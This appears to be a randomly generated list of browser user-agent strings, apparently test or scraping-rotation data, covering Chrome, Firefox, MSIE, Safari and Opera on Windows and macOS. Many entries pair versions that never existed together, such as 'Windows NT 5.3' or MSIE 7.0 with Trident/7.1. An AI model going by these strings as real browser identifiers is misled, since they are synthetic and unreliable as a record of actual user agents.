Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/532.0.0 (KHTML, like Gecko) Chrome/39.0.884.0 Safari/532.0.0
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/535.0.0 (KHTML, like Gecko) Chrome/36.0.893.0 Safari/535.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/531.0.0 (KHTML, like Gecko) Chrome/39.0.824.0 Safari/531.0.0
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/533.2.1 (KHTML, like Gecko) Chrome/15.0.883.0 Safari/533.2.1
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/3.0; .NET CLR 4.2.26807.1)
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/535.2.0 (KHTML, like Gecko) Chrome/22.0.875.0 Safari/535.2.0
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/533.0.2 (KHTML, like Gecko) Chrome/28.0.862.0 Safari/533.0.2
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_3 rv:4.0; CY) AppleWebKit/531.1.2 (KHTML, like Gecko) Version/5.1.8 Safari/531.1.2
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Trident/4.1; .NET CLR 1.2.46442.5)
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/531.2.2 (KHTML, like Gecko) Chrome/22.0.879.0 Safari/531.2.2
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/531.0.1 (KHTML, like Gecko) Chrome/17.0.814.0 Safari/531.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/534.2.0 (KHTML, like Gecko) Chrome/32.0.847.0 Safari/534.2.0
Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:13.5) Gecko/20100101 Firefox/13.5.1
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/24.0.856.0 Safari/534.0.2
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.8.2; rv:7.2) Gecko/20100101 Firefox/7.2.3
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_7)  AppleWebKit/537.1.2 (KHTML, like Gecko) Chrome/18.0.891.0 Safari/537.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/538.1.0 (KHTML, like Gecko) Chrome/31.0.822.0 Safari/538.1.0
Mozilla/5.0 (Windows NT 5.2; WOW64; rv:5.7) Gecko/20100101 Firefox/5.7.5
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1 rv:5.0; LN) AppleWebKit/537.0.0 (KHTML, like Gecko) Version/4.0.5 Safari/537.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/533.1.1 (KHTML, like Gecko) Chrome/18.0.857.0 Safari/533.1.1
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/534.1.0 (KHTML, like Gecko) Chrome/24.0.847.0 Safari/534.1.0
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/6.0; .NET CLR 4.3.44380.8)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_5 rv:4.0; MN) AppleWebKit/536.2.2 (KHTML, like Gecko) Version/4.0.10 Safari/536.2.2
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/6.0; .NET CLR 2.7.24563.9)
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/3.1; .NET CLR 2.2.71453.2)
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/533.2.1 (KHTML, like Gecko) Chrome/26.0.888.0 Safari/533.2.1
Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:5.6) Gecko/20100101 Firefox/5.6.4
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.10.4; rv:14.8) Gecko/20100101 Firefox/14.8.6
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/533.2.1 (KHTML, like Gecko) Chrome/26.0.820.0 Safari/533.2.1
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_9_7 rv:6.0; NO) AppleWebKit/536.1.1 (KHTML, like Gecko) Version/6.0.9 Safari/536.1.1
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.1; .NET CLR 3.8.69402.7)
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/536.2.1 (KHTML, like Gecko) Chrome/20.0.844.0 Safari/536.2.1
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/537.2.2 (KHTML, like Gecko) Chrome/24.0.813.0 Safari/537.2.2
Opera/13.27 (Macintosh; Intel Mac OS X 10.9.5 U; BE Presto/2.9.168 Version/12.00)
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:15.9) Gecko/20100101 Firefox/15.9.9
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/531.1.0 (KHTML, like Gecko) Chrome/15.0.847.0 Safari/531.1.0
Mozilla/5.0 (Windows NT 5.2; rv:7.4) Gecko/20100101 Firefox/7.4.3
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/535.1.2 (KHTML, like Gecko) Chrome/28.0.837.0 Safari/535.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/536.1.2 (KHTML, like Gecko) Chrome/37.0.845.0 Safari/536.1.2
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0; .NET CLR 2.0.72418.5)
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/534.1.1 (KHTML, like Gecko) Chrome/36.0.877.0 Safari/534.1.1
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/538.0.2 (KHTML, like Gecko) Chrome/24.0.821.0 Safari/538.0.2
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/535.2.2 (KHTML, like Gecko) Chrome/17.0.899.0 Safari/535.2.2
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.9.2; rv:6.1) Gecko/20100101 Firefox/6.1.7
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/536.0.2 (KHTML, like Gecko) Chrome/28.0.897.0 Safari/536.0.2
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; Trident/7.1; .NET CLR 4.2.38743.4)
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/537.2.2 (KHTML, like Gecko) Chrome/16.0.804.0 Safari/537.2.2
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/532.2.0 (KHTML, like Gecko) Chrome/18.0.839.0 Safari/532.2.0
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.3; Trident/4.0; .NET CLR 2.7.61815.2)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4)  AppleWebKit/533.0.1 (KHTML, like Gecko) Chrome/35.0.852.0 Safari/533.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/533.0.1 (KHTML, like Gecko) Chrome/14.0.883.0 Safari/533.0.1
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.3; Trident/3.1; .NET CLR 3.9.42429.7)
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/537.2.2 (KHTML, like Gecko) Chrome/31.0.899.0 Safari/537.2.2
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.2.2 (KHTML, like Gecko) Chrome/37.0.884.0 Safari/532.2.2
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/4.0; .NET CLR 2.2.34098.8)
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; .NET CLR 1.7.83715.8)
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/6.1; .NET CLR 3.5.85406.1)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_2 rv:5.0; RO) AppleWebKit/536.0.0 (KHTML, like Gecko) Version/4.0.7 Safari/536.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/536.1.2 (KHTML, like Gecko) Chrome/17.0.879.0 Safari/536.1.2
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_3 rv:4.0; MK) AppleWebKit/537.1.2 (KHTML, like Gecko) Version/5.1.8 Safari/537.1.2
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.1) Gecko/20100101 Firefox/6.1.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5)  AppleWebKit/533.2.1 (KHTML, like Gecko) Chrome/25.0.844.0 Safari/533.2.1
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/532.0.0 (KHTML, like Gecko) Chrome/30.0.834.0 Safari/532.0.0
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_0)  AppleWebKit/537.1.2 (KHTML, like Gecko) Chrome/39.0.846.0 Safari/537.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/532.0.0 (KHTML, like Gecko) Chrome/16.0.872.0 Safari/532.0.0
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/537.0.1 (KHTML, like Gecko) Chrome/19.0.830.0 Safari/537.0.1
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/538.0.1 (KHTML, like Gecko) Chrome/21.0.866.0 Safari/538.0.1
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; Trident/6.0; .NET CLR 1.1.93487.6)
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/535.0.2 (KHTML, like Gecko) Chrome/23.0.815.0 Safari/535.0.2
Opera/10.45 (X11; Linux i686; U; CO Presto/2.9.167 Version/11.00)
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/5.0; .NET CLR 2.4.62829.2)
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/537.2.1 (KHTML, like Gecko) Chrome/16.0.899.0 Safari/537.2.1
Mozilla/5.0 (Windows NT 6.0; WOW64; rv:13.1) Gecko/20100101 Firefox/13.1.4
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/532.1.1 (KHTML, like Gecko) Chrome/28.0.818.0 Safari/532.1.1
Opera/12.61 (X11; Linux i686; U; UZ Presto/2.9.162 Version/12.00)
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.0; Trident/6.1; .NET CLR 3.6.30889.6)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_4 rv:2.0; JV) AppleWebKit/532.1.0 (KHTML, like Gecko) Version/7.1.4 Safari/532.1.0
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_1 rv:3.0; AZ) AppleWebKit/537.1.1 (KHTML, like Gecko) Version/6.0.10 Safari/537.1.1
Mozilla/5.0 (Windows NT 6.2; rv:7.4) Gecko/20100101 Firefox/7.4.6
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/538.0.0 (KHTML, like Gecko) Chrome/14.0.894.0 Safari/538.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/537.0.2 (KHTML, like Gecko) Chrome/22.0.843.0 Safari/537.0.2
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_1 rv:3.0; MT) AppleWebKit/531.2.2 (KHTML, like Gecko) Version/7.1.9 Safari/531.2.2
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/534.2.1 (KHTML, like Gecko) Chrome/32.0.874.0 Safari/534.2.1
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/536.1.2 (KHTML, like Gecko) Chrome/27.0.839.0 Safari/536.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/536.1.1 (KHTML, like Gecko) Chrome/24.0.884.0 Safari/536.1.1
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; .NET CLR 1.8.24192.2)
Mozilla/5.0 (Windows NT 6.0; rv:15.6) Gecko/20100101 Firefox/15.6.6
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/537.2.0 (KHTML, like Gecko) Chrome/34.0.844.0 Safari/537.2.0
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/537.1.0 (KHTML, like Gecko) Chrome/26.0.812.0 Safari/537.1.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_9 rv:2.0; SC) AppleWebKit/537.1.2 (KHTML, like Gecko) Version/6.0.5 Safari/537.1.2
Mozilla/5.0 (Windows NT 5.2; Win64; x64; rv:15.9) Gecko/20100101 Firefox/15.9.5
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.1) Gecko/20100101 Firefox/8.1.8
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.2.0 (KHTML, like Gecko) Chrome/22.0.846.0 Safari/536.2.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_9)  AppleWebKit/534.2.1 (KHTML, like Gecko) Chrome/20.0.815.0 Safari/534.2.1
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.3; Trident/5.0; .NET CLR 3.6.15969.7)
Mozilla/5.0 (Windows NT 6.1; rv:15.2) Gecko/20100101 Firefox/15.2.8
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/537.2.2 (KHTML, like Gecko) Chrome/25.0.890.0 Safari/537.2.2
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.2) Gecko/20100101 Firefox/12.2.8
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/532.1.0 (KHTML, like Gecko) Chrome/25.0.812.0 Safari/532.1.0
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/534.1.2 (KHTML, like Gecko) Chrome/35.0.814.0 Safari/534.1.2
Mozilla/5.0 (Windows NT 6.2; rv:14.5) Gecko/20100101 Firefox/14.5.1
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/536.2.0 (KHTML, like Gecko) Chrome/26.0.889.0 Safari/536.2.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_9)  AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/13.0.807.0 Safari/534.0.2
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/537.2.1 (KHTML, like Gecko) Chrome/21.0.871.0 Safari/537.2.1
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/535.2.0 (KHTML, like Gecko) Chrome/25.0.870.0 Safari/535.2.0
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/538.0.1 (KHTML, like Gecko) Chrome/27.0.840.0 Safari/538.0.1
Mozilla/5.0 (Windows NT 6.0; WOW64; rv:6.1) Gecko/20100101 Firefox/6.1.8
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/535.1.0 (KHTML, like Gecko) Chrome/19.0.894.0 Safari/535.1.0
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/532.1.1 (KHTML, like Gecko) Chrome/31.0.812.0 Safari/532.1.1
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/534.2.2 (KHTML, like Gecko) Chrome/21.0.810.0 Safari/534.2.2
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:6.9) Gecko/20100101 Firefox/6.9.8
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.0; Trident/6.1; .NET CLR 3.1.29854.3)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1 rv:5.0; AZ) AppleWebKit/538.0.0 (KHTML, like Gecko) Version/6.0.1 Safari/538.0.0
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:7.9) Gecko/20100101 Firefox/7.9.7
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.0; Trident/6.1; .NET CLR 4.6.84170.0)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4 rv:2.0; NE) AppleWebKit/535.1.0 (KHTML, like Gecko) Version/4.1.2 Safari/535.1.0
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/532.0.0 (KHTML, like Gecko) Chrome/37.0.856.0 Safari/532.0.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_0 rv:5.0; NL) AppleWebKit/531.0.2 (KHTML, like Gecko) Version/5.1.10 Safari/531.0.2
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/531.0.0 (KHTML, like Gecko) Chrome/17.0.825.0 Safari/531.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/34.0.873.0 Safari/534.0.2
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/532.0.1 (KHTML, like Gecko) Chrome/31.0.810.0 Safari/532.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/536.2.0 (KHTML, like Gecko) Chrome/18.0.833.0 Safari/536.2.0
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/29.0.869.0 Safari/532.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.0.1 (KHTML, like Gecko) Chrome/37.0.868.0 Safari/536.0.1
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/537.2.0 (KHTML, like Gecko) Chrome/16.0.822.0 Safari/537.2.0
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_9)  AppleWebKit/533.0.1 (KHTML, like Gecko) Chrome/38.0.815.0 Safari/533.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/533.2.1 (KHTML, like Gecko) Chrome/35.0.882.0 Safari/533.2.1
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/535.0.0 (KHTML, like Gecko) Chrome/25.0.860.0 Safari/535.0.0
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/535.0.2 (KHTML, like Gecko) Chrome/27.0.888.0 Safari/535.0.2
Mozilla/5.0 (Windows NT 5.1; rv:10.7) Gecko/20100101 Firefox/10.7.8
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/535.1.2 (KHTML, like Gecko) Chrome/36.0.813.0 Safari/535.1.2
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; .NET CLR 4.5.98243.3)
Mozilla/5.0 (Windows NT 6.1; rv:15.4) Gecko/20100101 Firefox/15.4.6
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_9_9)  AppleWebKit/538.2.2 (KHTML, like Gecko) Chrome/13.0.805.0 Safari/538.2.2
Mozilla/5.0 (Windows NT 5.1; WOW64; rv:9.5) Gecko/20100101 Firefox/9.5.7
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/536.2.1 (KHTML, like Gecko) Chrome/21.0.877.0 Safari/536.2.1
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5.7; rv:15.2) Gecko/20100101 Firefox/15.2.3
Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:8.1) Gecko/20100101 Firefox/8.1.1
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_0 rv:2.0; GD) AppleWebKit/531.1.0 (KHTML, like Gecko) Version/4.0.10 Safari/531.1.0
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/531.0.2 (KHTML, like Gecko) Chrome/30.0.853.0 Safari/531.0.2
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/533.1.2 (KHTML, like Gecko) Chrome/17.0.803.0 Safari/533.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/28.0.864.0 Safari/534.0.2
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/537.2.0 (KHTML, like Gecko) Chrome/24.0.801.0 Safari/537.2.0
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.1; Trident/5.1; .NET CLR 1.3.26497.4)
Mozilla/5.0 (Windows NT 6.2; rv:8.6) Gecko/20100101 Firefox/8.6.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1 rv:4.0; RU) AppleWebKit/537.1.0 (KHTML, like Gecko) Version/7.0.9 Safari/537.1.0
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/534.1.2 (KHTML, like Gecko) Chrome/33.0.852.0 Safari/534.1.2
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:11.8) Gecko/20100101 Firefox/11.8.2
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; Trident/5.1; .NET CLR 1.7.25529.2)
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/535.2.0 (KHTML, like Gecko) Chrome/16.0.819.0 Safari/535.2.0
Mozilla/5.0 (Windows NT 6.0; Win64; x64; rv:8.7) Gecko/20100101 Firefox/8.7.0
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/532.1.1 (KHTML, like Gecko) Chrome/23.0.862.0 Safari/532.1.1
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/535.1.0 (KHTML, like Gecko) Chrome/18.0.899.0 Safari/535.1.0
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/538.0.2 (KHTML, like Gecko) Chrome/22.0.896.0 Safari/538.0.2
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/3.0; .NET CLR 3.6.12517.9)
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Trident/7.1; .NET CLR 3.8.26155.1)
Mozilla/5.0 (Windows NT 6.3; rv:6.9) Gecko/20100101 Firefox/6.9.2
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/538.0.2 (KHTML, like Gecko) Chrome/24.0.811.0 Safari/538.0.2
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/536.1.0 (KHTML, like Gecko) Chrome/34.0.821.0 Safari/536.1.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_6)  AppleWebKit/534.1.2 (KHTML, like Gecko) Chrome/31.0.813.0 Safari/534.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/537.1.2 (KHTML, like Gecko) Chrome/35.0.881.0 Safari/537.1.2
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_9)  AppleWebKit/537.2.0 (KHTML, like Gecko) Chrome/25.0.884.0 Safari/537.2.0
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/538.1.2 (KHTML, like Gecko) Chrome/38.0.876.0 Safari/538.1.2
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.3
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7)  AppleWebKit/538.0.1 (KHTML, like Gecko) Chrome/36.0.893.0 Safari/538.0.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4 rv:2.0; MK) AppleWebKit/538.2.2 (KHTML, like Gecko) Version/5.1.6 Safari/538.2.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2)  AppleWebKit/538.1.0 (KHTML, like Gecko) Chrome/23.0.831.0 Safari/538.1.0
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.0; Trident/6.0; .NET CLR 3.5.93348.9)
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/534.1.1 (KHTML, like Gecko) Chrome/38.0.845.0 Safari/534.1.1
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_4 rv:5.0; ET) AppleWebKit/535.1.1 (KHTML, like Gecko) Version/5.0.3 Safari/535.1.1
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/537.2.2 (KHTML, like Gecko) Chrome/28.0.850.0 Safari/537.2.2
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/536.2.0 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/536.2.0
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.2; Trident/3.1; .NET CLR 1.1.85581.7)
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/531.0.0 (KHTML, like Gecko) Chrome/23.0.833.0 Safari/531.0.0
Mozilla/5.0 (Windows NT 6.0; WOW64; rv:9.3) Gecko/20100101 Firefox/9.3.5
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.3; Trident/3.0; .NET CLR 3.5.16095.8)
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/537.1.2 (KHTML, like Gecko) Chrome/37.0.867.0 Safari/537.1.2
Mozilla/5.0 (Windows NT 5.2; Win64; x64; rv:6.4) Gecko/20100101 Firefox/6.4.7
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/538.1.1 (KHTML, like Gecko) Chrome/24.0.828.0 Safari/538.1.1
Mozilla/5.0 (Windows NT 5.2; WOW64; rv:7.3) Gecko/20100101 Firefox/7.3.9
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/5.0; .NET CLR 2.0.80739.5)
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/538.1.1 (KHTML, like Gecko) Chrome/22.0.812.0 Safari/538.1.1
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.0; Trident/4.0; .NET CLR 3.1.75493.3)
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/531.1.2 (KHTML, like Gecko) Chrome/28.0.814.0 Safari/531.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/533.2.1 (KHTML, like Gecko) Chrome/21.0.849.0 Safari/533.2.1
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/537.1.1 (KHTML, like Gecko) Chrome/29.0.816.0 Safari/537.1.1
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/535.0.2 (KHTML, like Gecko) Chrome/34.0.885.0 Safari/535.0.2
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/534.0.1 (KHTML, like Gecko) Chrome/38.0.874.0 Safari/534.0.1
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/537.1.1 (KHTML, like Gecko) Chrome/16.0.815.0 Safari/537.1.1
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/534.1.1 (KHTML, like Gecko) Chrome/28.0.880.0 Safari/534.1.1
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/29.0.827.0 Safari/534.0.2
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/538.0.2 (KHTML, like Gecko) Chrome/25.0.875.0 Safari/538.0.2
Opera/13.42 (Macintosh; Intel Mac OS X 10.9.2 U; CY Presto/2.9.170 Version/10.00)
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/533.0.2 (KHTML, like Gecko) Chrome/20.0.837.0 Safari/533.0.2
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.1; .NET CLR 1.9.24879.1)
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/4.1; .NET CLR 3.7.26561.3)
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/531.1.2 (KHTML, like Gecko) Chrome/35.0.800.0 Safari/531.1.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9.1; rv:11.0) Gecko/20100101 Firefox/11.0.6
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0 rv:3.0; CA) AppleWebKit/537.2.0 (KHTML, like Gecko) Version/5.0.8 Safari/537.2.0
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/538.1.1 (KHTML, like Gecko) Chrome/30.0.834.0 Safari/538.1.1
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.2.1 (KHTML, like Gecko) Chrome/30.0.853.0 Safari/536.2.1
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/532.0.1 (KHTML, like Gecko) Chrome/34.0.819.0 Safari/532.0.1
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/537.2.0 (KHTML, like Gecko) Chrome/21.0.866.0 Safari/537.2.0
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.1; Trident/5.1; .NET CLR 3.3.55981.2)
Mozilla/5.0 (Windows NT 6.3; rv:15.3) Gecko/20100101 Firefox/15.3.7
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/533.2.1 (KHTML, like Gecko) Chrome/23.0.832.0 Safari/533.2.1
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/30.0.816.0 Safari/532.1.2
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_1)  AppleWebKit/535.1.0 (KHTML, like Gecko) Chrome/13.0.836.0 Safari/535.1.0
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/534.2.2 (KHTML, like Gecko) Chrome/33.0.885.0 Safari/534.2.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5 rv:4.0; ET) AppleWebKit/531.1.2 (KHTML, like Gecko) Version/5.0.7 Safari/531.1.2
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_8_7 rv:5.0; GD) AppleWebKit/532.0.1 (KHTML, like Gecko) Version/6.0.6 Safari/532.0.1
